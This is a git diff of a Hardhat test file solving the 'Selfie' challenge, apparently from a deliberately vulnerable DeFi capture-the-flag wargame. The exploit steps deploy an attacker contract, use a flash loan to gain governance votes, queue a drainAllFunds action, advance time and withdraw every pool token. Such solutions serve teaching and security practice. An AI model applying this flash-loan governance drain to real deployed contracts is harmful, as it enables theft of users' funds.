@@ -27,9 +27,9 @@ describe('[Challenge] Selfie', function () {
 		expect(await this.token.balanceOf(this.pool.address)).to.be.equal(TOKENS_IN_POOL)
 	})
 
-	/** CODE YOUR EXPLOIT HERE */
 	it('Exploit', async function () {
-		// Deploy attacker contract
+		/** CODE YOUR EXPLOIT HERE */
+		// Deploy evil contract
 		const SelfieAttacker = await ethers.getContractFactory('SelfieAttacker', attacker)
 		this.selfieAttackerContract = await SelfieAttacker.deploy(
 			this.pool.address,
@@ -37,26 +37,29 @@ describe('[Challenge] Selfie', function () {
 			this.token.address
 		)
 
-		// Get flash loan, take snapshot, queue action and transfer tokens back
+		// Make a flash loan. This will take snapshot, queue evil action and transfer DVT back to pool
 		await this.selfieAttackerContract.connect(attacker).executeFlashLoan(TOKENS_IN_POOL)
 
-		// Wait two days
+		// Travel through time (2 days) in order to execute the queued action.
 		await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60])
 
-		// Execute the queued action. This will call the drainAllFunds of the pool contract
+		// Execute the queued action. This will call the drainAllFunds() function of the pool contract
+		// and send them to our evil contract.
 		await this.governance.connect(attacker).executeAction(1)
 
-		// Withdraw DVT from attacker contract
+		// Retrieve all DVT from attacker contract to attacker address.
 		await this.selfieAttackerContract.connect(attacker).withdrawTokens()
+
+		// Log balances
+		console.log('POOL DVT BALANCE: ', String(await this.token.balanceOf(this.pool.address)))
+		console.log('ATTACKER DVT BALANCE: ', String(await this.token.balanceOf(attacker.address)))
 	})
 
 	after(async function () {
 		/** SUCCESS CONDITIONS */
 		// Attacker has taken all tokens from the pool
 		expect(await this.token.balanceOf(attacker.address)).to.be.equal(TOKENS_IN_POOL)
-		console.log('ATTACKER DVT BALANCE: ', String(await this.token.balanceOf(attacker.address)))
 
 		expect(await this.token.balanceOf(this.pool.address)).to.be.equal('0')
-		console.log('POOL DVT BALANCE: ', String(await this.token.balanceOf(this.pool.address)))
 	})
 })
